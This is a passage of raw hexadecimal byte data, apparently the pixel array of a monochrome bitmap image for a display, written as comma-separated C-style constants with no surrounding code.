0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0C,0XFF,0XFF,0XFF,0XFF,0XFF,0XCC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X3F,
0XFF,0XE1,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X0F,0XFF,0XE1,0XFF,0XFC,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0X03,0XFF,0XE1,0XFF,0XF0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X7F,0XE1,0XFF,0X80,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFC,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X1E,0X00,
0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,
0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X18,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X01,0XEF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X0C,0X30,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X81,0XFC,
0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X03,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1C,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X0F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X01,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X7F,0XFF,0XE0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0XFF,0X80,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XF0,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X3F,0XFF,0XFF,0XFC,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XC0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF8,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0XC1,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X0E,0X0F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X06,0X00,0X67,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X08,0X6F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0C,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X3F,0X80,0XC7,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XF2,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X01,0XFF,0XFF,
0X9F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X47,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,0XE0,0X8F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X07,0XFF,0XFF,
0XFF,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X07,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X0F,
0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X0F,0XFF,0XFF,0XC0,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0F,0XFF,0XFE,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X1F,0XFF,0XFF,
0XFF,0XC0,0X00,0X1F,0XFF,0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1F,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X1F,
0XFF,0XFF,0XFC,0X00,0X00,0X1F,0XF8,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X1F,0XFF,0XFF,0XF8,0X00,0X00,0X1F,0XF0,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XE0,0X00,0X00,0X1F,0X80,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0X80,0X00,0X00,
0X3C,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XF8,0X00,0X1F,0XFF,0XFE,0X00,0X00,0X00,0X30,0X00,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XF8,0X00,
0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XFF,0XE0,0X00,0X03,0X00,0X00,0X00,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XC0,0X00,0X06,0X00,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X3F,0XFF,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,
0X3F,0XFC,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X3F,0XF0,0X00,0X00,0X7E,0X00,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X00,0X3F,0XC0,0X00,0X00,0XFC,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X7F,0X00,0X00,0X03,0XFC,
0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X7C,0X00,0X00,0X07,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X78,0X00,0X00,
0X0F,0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X00,0X00,0X60,0X00,0X00,0X1F,0XFC,0X00,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,
0X00,0X00,0X7F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0X00,0X00,0X00,0X00,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X06,
0X00,0X00,0X00,0X03,0XFF,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,0XFF,0XF0,0X00,
0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X1E,0X00,0X00,0X00,0X0F,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,
0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X00,0X00,0X3E,0X00,0X00,0X00,0X7F,0XFF,0XF0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0XFE,0X00,0X00,0X00,
0XFF,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X01,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XE0,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,
0X00,0X07,0XFF,0XFF,0XE0,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XE0,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X07,
0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XE1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFC,0X00,0X00,0X7F,0XFF,0XFF,0XC7,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X1F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XF8,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X80,0X00,0X7F,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XF8,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XF8,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X03,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
0XFF,0XF0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X80,0X3F,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X7F,0XFF,0XF0,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0XFF,0XFF,0XE0,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC1,0XFF,0XFF,0XE0,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC7,0XFF,0XFF,
0XE7,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XDF,
